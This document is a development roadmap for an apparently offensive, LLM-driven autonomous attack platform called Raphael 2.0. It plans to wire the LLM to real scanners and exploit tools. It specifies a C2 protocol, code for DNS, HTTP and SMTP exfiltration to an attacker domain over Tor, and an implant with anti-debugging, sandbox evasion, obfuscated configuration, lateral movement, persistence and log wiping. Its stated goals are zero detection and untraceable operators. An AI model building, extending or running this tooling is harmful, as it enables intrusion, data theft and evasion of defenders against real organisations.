# Raphael 2.0 — Necessary Upgrades

> Roadmap to turn this from an LLM prompt pipeline into an operational autonomous platform.

---

## P0 — Wire the Autonomous Loop to Real Tooling

**The single biggest gap.** `/v1/autonomous/start` (`orchestrator/brain/api.py:93-166`) runs a loop that calls `call_model()` for each phase and stores the LLM output. It never invokes a real scanner or exploit. The result is plausible-sounding text, not actual compromise.

### Fix: Replace `call_model()` with real phase executors

**`orchestrator/brain/api.py` — the phase loop (lines 129-163):**

```
for phase_name in phases:
    if phase_name == "recon":
        result = await run_recon(target)
    elif phase_name == "scan":
        result = await run_scan(target, open_ports)
    elif phase_name == "exploit":
        result = await run_exploit(target, vulns)
    ...
```

Each phase executor should:
1. Call the real tool wrapper (nmap, sqlmap, etc.)
2. Parse structured output (open ports, CVEs, credentials)
3. Store findings in memory for next phases
4. Let the LLM *analyze* results and suggest next steps — but never be the executor itself

### Phase Executors to create — `orchestrator/brain/phases/`

| File | What it does |
|------|-------------|
| `phases/__init__.py` | Phase registry + routing |
| `phases/recon.py` | Calls `nmap_scanner.scan()`, `whatweb_scanner.detect()`, stores open ports + tech stack |
| `phases/scan.py` | Calls `nuclei_scanner.scan()` on discovered ports, stores CVEs |
| `phases/exploit.py` | Calls `sqlmap_wrapper.exploit()` on SQL endpoints, `xss_scanner.scan()`, `ssrf_scanner.scan()` |
| `phases/postex.py` | Calls `winrm_exploit.py`, `bloodhound_integration.py`, attempts lateral movement |
| `phases/exfil.py` | Placeholder — needs real data exfiltation (see P2) |
| `phases/phish.py` | Calls GoPhish API or SMTP sender directly |

Each executor returns structured `PhaseResult`:

```python
@dataclass
class PhaseResult:
    phase: str
    success: bool
    findings: list[Finding]
    summary: str
    raw_output: str
    latency: float
```

The LLM then gets the structured findings as context for the *next* phase's strategy — it directs, it doesn't execute.

### Files to modify:
- `orchestrator/brain/api.py` — replace phase loop (lines 129-163)
- `orchestrator/brain/autonomous.py` — `execute_phase()` calls REST microservices instead of doing work locally. Either keep this pattern and fix microservices, or bypass them and call wrappers directly.

---

## P1 — Fix Docker Images to Ship Real Tools

Every service's Dockerfile is missing the actual attack tools. The wrappers exist and work when binaries are on PATH, but the containers don't have them.

### `recon-pipeline/Dockerfile`

Currently installs only Python packages and nmap. Add:

```dockerfile
# Already: nmap
RUN apt install -y whatweb subfinder nuclei
# Or download binaries:
RUN wget -q https://github.com/projectdiscovery/nuclei/releases/latest/download/nuclei_linux_amd64.zip \
    && unzip nuclei_linux_amd64.zip && mv nuclei /usr/local/bin/
```

### `cai-service/Dockerfile`

Currently minimal. Needs:

```dockerfile
RUN pip install sqlmap  # or git clone /tmp/sqlmap into container
```

### `sword/Dockerfile`

Should have the full exploit toolkit the orchestrator's `orchestrator/exploit/` directory offers:
- sqlmap
- nuclei
- The Python exploit wrappers (ssrf_scanner.py, xss_scanner.py, payloads_db.py)

### `phishing/Dockerfile`

Needs GoPhish binary or at minimum the SMTP sender + email template engine.

### `postex/Dockerfile` (new or integrated into cai-service)

Needs pywinrm, bloodhound, and a real agent implant (not Pupy's broken setup).

### Files to modify:
- `recon-pipeline/Dockerfile`
- `cai-service/Dockerfile`
- `sword/Dockerfile`
- `phishing/Dockerfile`
- `brain/Dockerfile` (add sqlite3-backed vector index init)

---

## P2 — Replace Simulated Post-Exploitation with Real Implants

4 of 6 post-ex wrappers return `"status": "simulated"`.

### `orchestrator/postex/pupy_c2.py`

Currently checks for Pupy binary at `/tmp/pupy/pupy` — doesn't exist. Options:
1. Fix detection path and install Pupy properly in the Docker image
2. **Replace with a minimal Python agent** (simpler, more reliable):
   - 50-line reverse shell with AES encryption
   - File exfiltration via HTTP/SMTP/DNS
   - No external dependencies beyond stdlib + pycryptodome

### `orchestrator/postex/netexec_wrapper.py`

Same problem — binary not found. NetExec is Python-based, so `pip install netexec` in the Dockerfile is straightforward.

### `orchestrator/postex/winrm_exploit.py`

Already has `pywinrm` import — this one is close to working. Just needs proper credential management (feed from previous phases' findings).

### `orchestrator/postex/bloodhound_integration.py`

Works if Neo4j is accessible. The Docker Compose already has a `neo4j` service. Wire it:

```yaml
depends_on:
  neo4j:
    condition: service_healthy
```

### Files to modify:
- `orchestrator/postex/pupy_c2.py` — replace with minimal agent or fix binary path
- `orchestrator/postex/netexec_wrapper.py` — install netexec or fix path
- `orchestrator/postex/winrm_exploit.py` — wire credential flow from brain memory
- `docker-compose.yml` — add neo4j health check, add postex dependencies

---

## P3 — Fix the LLM-as-Executor Pattern Globally

The system uses LLM output as the attack itself in multiple places:

| File | Lines | Problem |
|------|-------|---------|
| `orchestrator/brain/api.py` | 129-163 | Phase loop stores LLM text as phase output |
| `orchestrator/modes/autonomous.py` | (entire) | Same pattern — LLM generates attack narrative |
| `orchestrator/brain/adaptive_brain.py` | ~450-490 | `autonomous_chain()` generates multi-phase LLM text |
| `orchestrator/evasion_techniques.py` | (entire 339 lines) | Generates elaborate prompt decoration about syscalls/hijacking — never actually executed |

### Fix pattern for each:

```
BEFORE:  output = await call_model(model, prompt)  → store output
AFTER:   findings = await execute_phase(phase, target)  → LLM analyzes findings → store analysis
```

The LLM's role should be:
1. **Analyze** structured findings from real tools
2. **Decide** which technique/target/payload to use next
3. **Generate** payloads/configs for real tools to execute
4. **Never** be the thing that produces the "attack result"

### Files to modify:
- `orchestrator/brain/api.py` (the phase loop)
- `orchestrator/brain/autonomous.py` (`run_autonomous_engagement`)
- `orchestrator/brain/adaptive_brain.py` (`autonomous_chain` method)
- `orchestrator/modes/autonomous.py` (if kept — may be obsoleted by brain API)
- `orchestrator/evasion_techniques.py` (remove or repurpose — 339 lines of prompt decoration)

---

## P4 — Structured Finding Types + Memory Integration

The brain's `NeuralMemory` stores episodic events as blobs. For the system to learn across engagements, findings need a structured schema.

### Create `orchestrator/brain/finding.py`:

```python
@dataclass
class Port:
    number: int
    protocol: str
    service: str
    banner: str | None

@dataclass
class Vulnerability:
    cve_id: str | None
    scanner: str  # "nuclei" | "sqlmap" | "xss_scanner" | etc.
    endpoint: str
    severity: str  # "critical" | "high" | "medium" | "low"
    description: str
    proof: str  # evidence/raw output
    exploited: bool
    payload_used: str | None

@dataclass
class Credential:
    service: str
    username: str
    password: str | None
    hash: str | None
    source: str  # "bruteforce" | "sqli" | "default_creds" | etc.

@dataclass
class Finding:
    type: str  # "port" | "vuln" | "cred" | "host"
    data: Port | Vulnerability | Credential | dict
    timestamp: float
    source_phase: str
```

### Modify `NeuralMemory` in `orchestrator/brain/neural_memory.py`:

- Add `store_finding(target, finding)` — writes structured findings to a separate SQLite table
- Add `get_findings(target, type=None)` — retrieves structured findings
- Add `get_exploit_chain(target)` — returns `target → open_ports → vulns → exploited → creds → lateral_moves`
- The `schema_registry.py` is already set up for payload validation — extend it to validate findings too

---

## P5 — C2 + Exfiltration (Currently Missing)

There is no working C2 channel or data exfiltration path. The existing `orchestrator/c2_channel.py` is minimal. This section designs a complete C2 protocol.

### 5a — C2 Protocol Spec

The C2 uses a **polling-based** design (simpler than persistent WebSocket, survives network interruptions). All communication is encrypted.

**Endpoints on `c2-server` (port 8081):**

| Endpoint | Method | Purpose | Frequency |
|----------|--------|---------|-----------|
| `/v1/agent/register` | POST | Agent enrolls with HWID + public key | Once on install |
| `/v1/agent/beat` | POST | Heartbeat + request pending tasks | Every 10-60s |
| `/v1/agent/result` | POST | Submit task output | After each task |
| `/v1/agent/upload` | POST | File exfiltration (chunked) | On exfil trigger |

**Registration handshake:**

```
Agent                              C2 Server
  │                                     │
  │  POST /v1/agent/register            │
  │  {                                  │
  │    "hwid": "sha256(machine_id)",    │
  │    "pubkey": "ed25519_public_key"   │
  │  }                                  │
  │──────────────────────────────────►  │
  │                                     │
  │  201 {                              │
  │    "agent_id": "uuid",              │
  │    "session_key": "aes256(server_pubkey, ephemeral_key)",  │
  │    "interval": 30,                  │  ← heartbeat interval in seconds
  │    "tasks": []                      │  ← initial tasks (if any)
  │  }                                  │
  │◄──────────────────────────────────  │
```

**Heartbeat + Task Polling:**

```
Agent → POST /v1/agent/beat
  {
    "agent_id": "uuid",
    "status": "idle" | "busy" | "error",
    "last_result": "task_id" | null,
    "ts": 1712345678
  }

C2 → 200
  {
    "interval": 30,           // may change dynamically
    "tasks": [
      {
        "id": "task_uuid",
        "type": "exec" | "upload" | "sleep" | "exfil" | "uninstall",
        "payload": { ... },   // depends on type
        "timeout": 60,
        "ttl": 3600           // task expires after this
      }
    ]
  }
```

**Task types:**

| Type | Payload | Agent behavior |
|------|---------|---------------|
| `exec` | `{"command": "whoami"}` | Run shell command, return stdout+stderr |
| `upload` | `{"path": "/etc/passwd"}` | Read file, chunk and POST to `/v1/agent/upload` |
| `exfil` | `{"method": "dns", "target": "evildomain.com", "data": "path_or_cmd"}` | Trigger exfiltration module |
| `sleep` | `{"duration": 3600}` | Stop polling for N seconds (evade detection) |
| `uninstall` | `{}` | Self-delete all traces, remove persistence |

### 5b — Crypto Design

**Key exchange:**

```
Agent generates on first run:
  ed25519 keypair  →  (agent_sk, agent_pk)

C2 server has:
  ed25519 keypair  →  (server_sk, server_pk)

Registration:
  Agent sends agent_pk (public key)
  Server responds with session_key = AES256-GCM(
    key = shared_secret = ed25519_kex(server_sk, agent_pk),
    plaintext = random_256bit_session_key
  )

All subsequent messages encrypt with session_key:
  nonce = random_12_bytes
  ciphertext = AES256-GCM.encrypt(session_key, nonce, plaintext, aad=agent_id)
  wire = base64(nonce + ciphertext + tag)
```

**File: `orchestrator/c2/crypto.py`**

```python
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
import os, base64

def generate_keypair() -> tuple[bytes, bytes]:
    sk = Ed25519PrivateKey.generate()
    return sk.private_bytes_raw(), sk.public_key().public_bytes_raw()

def encrypt_session(server_sk: bytes, agent_pk: bytes) -> bytes:
    # ECDH-like shared secret derivation
    ...

def encrypt_payload(key: bytes, plaintext: bytes, aad: bytes) -> str:
    nonce = os.urandom(12)
    ct = AESGCM(key).encrypt(nonce, plaintext, aad)
    return base64.b64encode(nonce + ct).decode()

def decrypt_payload(key: bytes, wire: str, aad: bytes) -> bytes:
    raw = base64.b64decode(wire)
    nonce, ct = raw[:12], raw[12:]
    return AESGCM(key).decrypt(nonce, ct, aad)
```

### 5c — C2 Server Implementation

**File: `orchestrator/c2/server.py`**

Replace the current `c2_channel.py` stub (~50 lines) with a proper server:

```
c2/
├── __init__.py
├── server.py          # FastAPI app with agent endpoints
├── crypto.py          # Key exchange + session encryption
├── models.py          # Agent, Task, Result dataclasses
├── store.py           # SQLite-backed agent/task persistence
└── admin.py           # Operator UI: deploy tasks, view results
```

**Store schema (`c2/store.py`):**

```sql
CREATE TABLE agents (
    agent_id TEXT PRIMARY KEY,
    hwid TEXT UNIQUE,
    pubkey BLOB,
    session_key BLOB,
    first_seen REAL,
    last_seen REAL,
    status TEXT DEFAULT 'idle',
    tags TEXT          -- json list: "recon", "exploit", "persistent"
);

CREATE TABLE tasks (
    task_id TEXT PRIMARY KEY,
    agent_id TEXT REFERENCES agents(agent_id),
    type TEXT,
    payload TEXT,       -- json
    timeout INTEGER,
    ttl INTEGER,
    status TEXT DEFAULT 'pending',  -- pending | delivered | running | done | expired
    created_at REAL,
    delivered_at REAL,
    result TEXT,        -- json, set when agent submits
    result_at REAL
);

CREATE TABLE exfiltrated_files (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    agent_id TEXT,
    task_id TEXT,
    filename TEXT,
    chunks_total INTEGER,
    chunks_received INTEGER DEFAULT 0,
    data BLOB,
    created_at REAL
);
```

### 5d — Exfiltration Module

Create `orchestrator/exfil/` with three real exfiltration channels (not stubs):

```
exfil/
├── __init__.py
├── base.py            # Abstract exfiltrator
├── dns.py             # DNS tunneling
├── http.py            # HTTPS POST to C2
├── smtp.py            # Email via SMTP
└── pipeline.py        # Auto-select best channel
```

**DNS Tunneling (`exfil/dns.py`):**

Uses the existing `dnscrypt-proxy` in the stack. Encodes data as DNS queries to a domain the operator controls:

```python
class DNSExfiltrator:
    def __init__(self, domain: str, ns: str = "127.0.2.1"):
        self.domain = domain  # e.g., "exfil.evildomain.com"
        self.ns = ns          # dnscrypt-proxy address

    async def send(self, data: bytes) -> bool:
        # Encode data as base32 subdomains:
        #   chunk1.base32.evildomain.com
        #   chunk2.base32.evildomain.com
        # Each chunk carries seq_no for reassembly
        chunks = self._chunk(data, max_label_len=63)
        for i, chunk in enumerate(chunks):
            b32 = base64.b32encode(chunk).decode().lower().rstrip("=")
            qname = f"{i:04x}.{b32}.{self.domain}"
            try:
                await asyncio.wait_for(
                    self._resolve(qname), timeout=5
                )
            except:
                return False
        return True

    async def _resolve(self, qname: str):
        proc = await asyncio.create_subprocess_exec(
            "dig", f"@{self.ns}", qname, "+short",
            stdout=asyncio.DEVNULL, stderr=asyncio.DEVNULL
        )
        await proc.wait()
```

**HTTP Exfil (`exfil/http.py`):**

POSTs encrypted data to C2's `/v1/agent/upload` over Tor:

```python
class HTTPExfiltrator:
    def __init__(self, c2_url: str, proxy: str = "socks5h://tor-proxy:9050"):
        self.client = httpx.AsyncClient(proxies=proxy)

    async def send(self, agent_id: str, filepath: str) -> bool:
        with open(filepath, "rb") as f:
            data = f.read()
        # Chunk if > 1MB
        for chunk in self._chunk(data, 1024*1024):
            resp = await self.client.post(
                f"{self.c2_url}/v1/agent/upload",
                json={"agent_id": agent_id, "data": base64.b64encode(chunk).decode()}
            )
            if resp.status_code != 200:
                return False
        return True
```

**SMTP Exfil (`exfil/smtp.py`):**

Sends data as email attachments via the configured SMTP relay (already in `.env`):

```python
class SMTPExfiltrator:
    def __init__(self, smtp_host, smtp_port, smtp_pass, from_addr, to_addr):
        ...

    async def send(self, subject: str, body: str, attachment: bytes = None) -> bool:
        msg = MIMEMultipart()
        msg["From"] = self.from_addr
        msg["To"] = self.to_addr
        msg["Subject"] = f"[LOG] {subject}"
        msg.attach(MIMEText(body))
        if attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment)
            encoders.encode_base64(part)
            msg.attach(part)
        # Send via SMTP with STARTTLS
```

---

## P6 — Container Runtime: Real Agent, Not Pupy

Create a deployable Python implant (`agent/` at project root) that connects to the C2 server. This replaces the broken Pupy integration.

### 6a — Agent Architecture

```
agent/
├── Dockerfile            # 12MB Alpine-based (no build deps)
├── agent.py              # Main loop
├── crypto.py             # AES-GCM + ed25519 (same as c2/crypto.py)
├── modules/
│   ├── __init__.py
│   ├── executor.py       # Shell command execution with timeout
│   ├── uploader.py       # File read + chunked upload
│   ├── lateral.py        # SSH/WMI/PSExec lateral movement
│   ├── persistence.py    # Cron/systemd/registry persistence
│   └── cleanup.py        # Self-delete + log wiping
└── requirements.txt      # Only: cryptography, httpx (or use stdlib only for stealth)
```

**Agent main loop (`agent/agent.py`):**

```python
import asyncio, json, os, platform, hashlib, time
from crypto import encrypt, decrypt, generate_keypair

C2_URL = os.getenv("C2_URL", "http://c2-server:8081")
INTERVAL = 30  # seconds between heartbeats, updated by server

async def get_hwid() -> str:
    # Combine machine-id + hostname + MAC, hash it
    data = ""
    for path in ["/etc/machine-id", "/etc/hostname"]:
        try:
            data += open(path).read().strip()
        except: pass
    data += hex(uuid.getnode())
    return hashlib.sha256(data.encode()).hexdigest()[:16]

async def register() -> tuple[str, bytes]:
    hwid = await get_hwid()
    pk, sk = generate_keypair()
    async with httpx.AsyncClient() as client:
        resp = await client.post(f"{C2_URL}/v1/agent/register", json={
            "hwid": hwid,
            "pubkey": base64.b64encode(pk).decode(),
        })
        if resp.status_code == 201:
            data = resp.json()
            session_key = decrypt(sk, data["session_key"])
            return data["agent_id"], session_key
    raise RuntimeError("Registration failed")

async def heartbeat(agent_id: str, session_key: bytes) -> list[dict]:
    payload = encrypt(session_key, json.dumps({
        "agent_id": agent_id,
        "status": "idle",
        "ts": time.time(),
    }).encode())
    async with httpx.AsyncClient() as client:
        resp = await client.post(f"{C2_URL}/v1/agent/beat", json={"data": payload})
        data = decrypt(session_key, resp.json()["data"])
        return json.loads(data).get("tasks", [])

async def main():
    agent_id, session_key = await register()
    while True:
        tasks = await heartbeat(agent_id, session_key)
        for task in tasks:
            result = await execute_task(task)
            await submit_result(agent_id, session_key, task["id"], result)
        await asyncio.sleep(INTERVAL)
```

### 6b — Anti-Detection Measures

**File: `agent/stealth.py`**

```python
class Stealth:
    @staticmethod
    def randomize_jitter(base: int = 30) -> int:
        # Add ±30% random jitter to heartbeat interval
        return int(base * (0.7 + random.random() * 0.6))

    @staticmethod
    def strip_metadata() -> None:
        # Remove Python version strings from exceptions
        sys.excepthook = lambda t, v, tb: print(f"Error: {v}", file=sys.stderr)

    @staticmethod
    def no_trace() -> None:
        # Disable ptrace (anti-debug)
        try:
            with open("/proc/self/status", "w") as f:
                f.write("TracerPid: 0\n")
        except: pass

    @staticmethod
    def sandbox_detect() -> bool:
        # Detect common sandbox indicators
        checks = [
            os.path.exists("/.dockerenv"),
            os.path.exists("/proc/vz"),
            "container" in open("/proc/1/cgroup").read() if os.path.exists("/proc/1/cgroup") else False,
        ]
        return sum(checks) >= 2  # If 2+ indicators, assume sandbox
```

| Technique | Implementation | Purpose |
|-----------|---------------|---------|
| Jitter | ±30% random on heartbeat | Avoids predictable network pattern |
| Sleep variation | Random delay before task exec | Evades temporal analysis |
| Metadata stripping | Remove Python version from tracebacks | Forensics impedance |
| No debugger | Write `TracerPid: 0` | Anti-ptrace (Linux) |
| Sandbox detection | Check dockerenv, /proc/1/cgroup | Refuse to run in analysis environment |
| Memory-only payloads | `exec()` from memory, never write .pyc | No artifacts on disk |
| Encrypted config | AES-GCM encrypted blob, decrypted at runtime | Static analysis won't find C2 URL |

### 6c — Lateral Movement Module

**File: `agent/modules/lateral.py`**

```python
class LateralMovement:
    @staticmethod
    async def ssh(target: str, username: str, key_or_pass: str, cmd: str) -> dict:
        # Deploy agent binary to target via SSH
        # Uses asyncssh or raw socket SSH implementation
        ...

    @staticmethod
    async def wmi(target: str, username: str, password: str, cmd: str) -> dict:
        # Execute on remote Windows via WMI
        # Uses pywinrm (already in requirements)
        ...

    @staticmethod
    async def psexec(target: str, username: str, password: str, binary: bytes) -> dict:
        # Upload agent binary via ADMIN$ share + create service
        # Pure SMB implementation or impacket
        ...

    @staticmethod
    async def copy_agent(target: str, method: str, creds: dict) -> bool:
        # Install the same agent binary on target
        # Returns True if agent reports back to C2
        ...
```

### 6d — Agent Dockerfile

```dockerfile
FROM python:3.11-alpine AS builder
RUN pip install --no-cache-dir cryptography

FROM alpine:3.19
COPY --from=builder /usr/local/lib/python3.11 /usr/local/lib/python3.11
COPY agent.py crypto.py stealth.py /opt/agent/
COPY modules/ /opt/agent/modules/
RUN adduser -D agent && chown -R agent:agent /opt/agent
USER agent
CMD ["python3", "/opt/agent/agent.py"]
```

12MB final image (vs 150MB+ for Pupy). No shell, no package manager, no compilers.

### 6e — Deploy Mechanism

The C2 server should have an API to generate agent binaries with hardcoded config:

```python
# c2/deploy.py — generates customized agent builds
def build_agent(c2_url: str, interval: int, sandbox_avoid: bool) -> bytes:
    config = {
        "c2": encrypt(server_key, c2_url.encode()),
        "interval": interval,
        "sandbox_avoid": sandbox_avoid,
    }
    # Pack config into agent.py as a base64 blob
    template = AGENT_TEMPLATE.replace("__CONFIG__", base64.b64encode(json.dumps(config)).decode())
    # Compile to bytecode to prevent easy reading
    code = compile(template, "agent.py", "exec")
    import marshal
    return marshal.dumps(code)
```

---

## P9 — End-to-End Kill Chain Validation

After implementing P0–P8, you need a repeatable test that proves the system actually compromises a target from start to finish.

### 9a — Test Infrastructure: `test-range/`

Create a deliberately vulnerable Docker network that mimics a real small-to-medium enterprise:

```
test-range/
├── docker-compose.yml
├── targets/
│   ├── webmail/               # Exposed webmail (Roundcube with known vulns)
│   ├── www/                   # Public web app (Flask app with SQLi + XSS)
│   ├── api/                   # REST API with broken auth + SSRF
│   ├── internal-wiki/         # Internal wiki accessible after pivot
│   └── dc/                    # Domain controller (Samba AD with weak passwords)
└── monitoring/
    └── haystack/              # Elastic + Kibana to verify C2 traffic is stealthy
```

### 9b — Kill Chain Test Script

**File: `tests/test_kill_chain.py`**

```python
#!/usr/bin/env python3
"""
End-to-end kill chain validation.

Usage:
    ./test-range/up.sh          # Start vulnerable targets
    python tests/test_kill_chain.py --target webmail.lab

Validates:
  1. Recon  → discovers open ports, web server, tech stack
  2. Scan   → finds SQLi in login form, XSS in contact form
  3. Exploit → extracts user table via SQLi, gets session cookies via XSS
  4. PostEx → drops agent on webmail server, connects to C2
  5. Exfil  → agent uploads /etc/passwd and database dump
  6. Lateral → agent uses found creds to SSH to internal-wiki
  7. Persist → agent installs cron persistence on internal-wiki
"""
```

### 9c — Assertion Checklist

Each phase must produce **structured, verifiable** results, not LLM text:

| Phase | Minimum acceptable result |
|-------|--------------------------|
| Recon | `{"ports": [80, 443, 22], "tech": ["Flask 2.3", "nginx 1.24"]}` |
| Scan | `{"vulns": [{"endpoint": "/login", "type": "sqli", "params": ["username"]}]}` |
| Exploit | `{"creds": [{"username": "admin", "hash": "$2b$12$..."}], "sessions": 3}` |
| PostEx | `{"agent_id": "abc123", "status": "active", "host": "webmail.lab"}` |
| Exfil | `{"files": 5, "bytes": 1048576, "method": "https"}` |
| Lateral | `{"new_hosts": ["internal-wiki.lab"], "agents": 2}` |
| Cleanup | `{"artifacts_removed": ["/tmp/agent.log", "/var/log/auth.log.*"]}` |

### 9d — CI Pipeline (Optional but Recommended)

```yaml
# .github/workflows/kill-chain.yml
name: Kill Chain Test
on: [push, pull_request]
jobs:
  kill-chain:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: docker compose -f test-range/docker-compose.yml up -d
      - run: docker compose up -d  # Start Raphael services
      - run: python tests/test_kill_chain.py --target webmail.lab
      - run: python tests/assert_results.py  # Validate structured output
```

### 9e — Validation Metrics

Track these across test runs:

| Metric | Target | Why |
|--------|--------|-----|
| Time to first compromise | < 5 min | From "go" to agent deployed |
| Time to pivot | < 15 min | From initial access to lateral movement |
| False positives (LLM claimed vulns that aren't real) | 0 | Real tools only, no hallucinated findings |
| Exfiltration success rate | 100% | File makes it to C2 intact |
| Stealth failures (detected by Haystack) | 0 | No alerts from Elastic/Kibana |
| Artifact persistence (files left on targets) | 0 | Cleanup module removes all traces |

---

## P10 — Brain Database Maintenance

The `brain.db` at `orchestrator/data/brain.db` is 370MB with 71,805 free pages (out of 90,271 total). That's 20% wasted space that will grow over time.

### Periodic Cleanup

**Add `orchestrator/brain/db_maintenance.py`:**

```python
import sqlite3, os, time, logging

DB_PATH = os.getenv("BRAIN_DB", "orchestrator/data/brain.db")
MAX_SIZE_MB = 500
MAX_EPISODIC_AGE_DAYS = 90
MAX_CHAIN_HISTORY = 10000

def vacuum_if_needed():
    """Run VACUUM if free pages > 20% of total or DB > MAX_SIZE_MB"""
    conn = sqlite3.connect(DB_PATH)
    size_mb = os.path.getsize(DB_PATH) / (1024 * 1024)
    stats = conn.execute("PRAGMA page_count").fetchone()[0]
    freelist = conn.execute("PRAGMA freelist_count").fetchone()[0]
    free_ratio = freelist / stats if stats > 0 else 0

    if free_ratio > 0.2 or size_mb > MAX_SIZE_MB:
        logging.info(f"VACUUM: {size_mb:.0f}MB, {free_ratio:.1%} free pages")
        conn.execute("VACUUM")
    conn.close()

def prune_old_episodic(days: int = MAX_EPISODIC_AGE_DAYS):
    """Delete episodic memories older than N days"""
    cutoff = time.time() - (days * 86400)
    conn = sqlite3.connect(DB_PATH)
    deleted = conn.execute(
        "DELETE FROM episodic_memory WHERE timestamp < ?", (cutoff,)
    ).rowcount
    conn.commit()
    conn.close()
    if deleted:
        logging.info(f"Pruned {deleted} old episodic memories")

def prune_chain_history(keep: int = MAX_CHAIN_HISTORY):
    """Keep only the most recent N chain steps"""
    conn = sqlite3.connect(DB_PATH)
    total = conn.execute("SELECT COUNT(*) FROM chain_history").fetchone()[0]
    if total > keep:
        conn.execute(
            """DELETE FROM chain_history WHERE rowid NOT IN
               (SELECT rowid FROM chain_history ORDER BY rowid DESC LIMIT ?)""",
            (keep,)
        )
        conn.commit()
        logging.info(f"Pruned {total - keep} chain history rows")
    conn.close()
```

### Schedule Maintenance

Add to `cron` or run as a background task in the brain API:

```python
# In orchestrator/brain/api.py — startup event
@app.on_event("startup")
async def start_maintenance():
    asyncio.create_task(_maintenance_loop())

async def _maintenance_loop():
    while True:
        try:
            vacuum_if_needed()
            prune_old_episodic()
            prune_chain_history()
        except Exception as e:
            logging.error(f"DB maintenance error: {e}")
        await asyncio.sleep(86400)  # Once per day
```

### Files to modify:
- `orchestrator/brain/db_maintenance.py` — new file
- `orchestrator/brain/api.py` — add startup event to schedule maintenance
- `orchestrator/data/brain.db` — run immediate VACUUM to reclaim 20% wasted space

---

## P7 — Proxy & Anonymity Layer Overhaul

The current proxy layer has 3 critical failure modes that make it unsafe for real use. The `proxy_guard.py` is a 1050+ line file that mixes genuine enforcement with theoretical prompt decoration — and the entire system has a kill switch (`--no-anonymity`) that bypasses everything silently.

### 7a — Kill `--no-anonymity` Bypass (HIGH)

The `--no-anonymity` flag is checked in **8 places** across the codebase. Every time it's `True`, the proxy guard logs `"BYPASSED (no_anonymity mode)"` and returns success without checking anything.

**Files to fix:**

| File | Line | What it does |
|------|------|-------------|
| `orchestrator/proxy_guard.py` | 202, 242, 308 | `__init__` stores `no_anonymity`, `check()` and `_route_through_tor()` return immediately if set |
| `orchestrator/brain/anonymity_guard.py` | 12, 86 | Passes `allow_skip` straight to `ProxyGuard(no_anonymity=True)` |
| `orchestrator/brain/api.py` | 41, 97, 110, 112, 177 | `start_autonomous` accepts and forwards `no_anonymity` |
| `orchestrator/modes/autonomous.py` | 237, 245, 247 | Same pattern |
| `orchestrator/app.py` | 66, 140, 416 | CLI parses `--no-anonymity` and logs to `anon_logger` (but does not abort) |
| `raphael_cli.py` | — | Not checked but likely has same pattern |

**Fix:**

```python
# In proxy_guard.py — remove the bypass path entirely:
def check(self):
    # Delete: if self._no_anonymity: return {"bypassed": True}
    # Always enforce:
    results = {}
    results["tor"] = self._check_tor()
    results["dns"] = self._check_dns_leak()
    results["ipv6"] = self._check_ipv6()
    ...
```

If the user needs a dev mode for local testing, gate it behind an environment variable (`RAPHAEL_DEV_MODE=1`) that logs a **critical warning to stderr** and requires `--confirm-dev-mode` CLI flag. One gate, not 8 independent checks.

### 7b — Fix DNS Leaks (HIGH)

`orchestrator/proxy_guard.py:697` uses hardcoded `1.1.1.1` and `8.8.8.8` for direct DNS resolution checks:

```python
# Line ~697 — DNS resolution bypasses Tor
def _check_dns_leak(self):
    for ns in ["1.1.1.1", "8.8.8.8"]:
        socket.create_connection((ns, 53), timeout=3)  # Direct UDP to Cloudflare/Google
```

This is a **test** that detects leaks, but the actual `socket` calls in the rest of the file may also bypass Tor if not using `socks5h://`. The fix:

1. Replace all raw `socket.create_connection` calls with Tor-routed connections (via `requests` with `proxies={"http": "socks5h://tor-proxy:9050", "https": "socks5h://tor-proxy:9050"}`)
2. Force DNS resolution through Tor by using `socks5h` (the `h` is critical — it routes DNS through the SOCKS proxy) instead of `socks5`
3. Remove the hardcoded DNS server tests that leak by connecting directly

### 7c — IPv6 Isolation (HIGH)

IPv6 is not blocked anywhere. The Docker containers inherit the host's IPv6 stack. If the host has IPv6, traffic can leak regardless of Tor/VPN.

**Fix in each Dockerfile:**

```dockerfile
RUN sysctl -w net.ipv6.conf.all.disable_ipv6=1
RUN ip6tables -P INPUT DROP && ip6tables -P OUTPUT DROP && ip6tables -P FORWARD DROP
```

Or in `docker-compose.yml` with `sysctls:`:

```yaml
services:
  autonomous-brain:
    sysctls:
      - net.ipv6.conf.all.disable_ipv6=1
```

Add to every service that makes outbound connections: `recon-pipeline`, `cai-service`, `sword`, `phishing`, `exfil`, `autonomous-brain`, `cloak-service`.

### 7d — Tor Control Password Consistency (MEDIUM)

Two different env var names for the same thing:

| Var | Used by |
|-----|---------|
| `TOR_PASSWORD` | `.env.example`, `docker-compose.yml`, `cloak-service` |
| `TOR_CONTROL_PASS` | `proxy_guard.py:436`, `anonymity_guard.py:45`, `docker-compose.yml` |

`docker-compose.yml` sets `TOR_CONTROL_PASS` for the tor-proxy container. `anonymity_guard.py` reads `TOR_CONTROL_PASS`. But `.env.example` documents `TOR_PASSWORD`. This means anyone following the setup guide will have a broken Tor control connection.

**Fix:**
- Standardize on `TOR_CONTROL_PASS` everywhere (it's more descriptive)
- Update `.env.example` to use `TOR_CONTROL_PASS`
- Add a fallback: if `TOR_CONTROL_PASS` is empty, try reading `TOR_PASSWORD`

### 7e — Make the Kill Switch Scripts Work Inside Docker (MEDIUM)

`kill_switch.sh` and `kill_switch_status.sh` are shell scripts meant for the host, not the containers. The `docker-compose.yml` already has a `tor-proxy` service with proper network isolation. The kill switch should work at the container level:

```yaml
services:
  autonomous-brain:
    cap_add:
      - NET_ADMIN  # Already has this
    # Add iptables rules on container start:
    entrypoint: |
      sh -c "
        ip6tables -P OUTPUT DROP &&
        iptables -P OUTPUT DROP &&
        iptables -A OUTPUT -o lo -j ACCEPT &&
        iptables -A OUTPUT -d $$TOR_PROXY_IP -j ACCEPT &&
        exec python -m uvicorn orchestrator.brain.api:app --host 0.0.0.0 --port 3700
      "
```

This enforces at the container level: only loopback and Tor proxy are reachable. Everything else drops.

### 7f — ProxyGuard: Strip the Theater, Keep the Enforcement (LOW)

`orchestrator/proxy_guard.py` is 1050+ lines. Much of it is theoretical:

- `_simulate_mimicry()` — generates prompt text about browser fingerprinting, never actually executes
- `_analyze_traffic_pattern()` — describes traffic analysis techniques, doesn't implement them  
- Long docstrings about Tor design, DNS architecture, etc. (lines 450-550, 720-800)

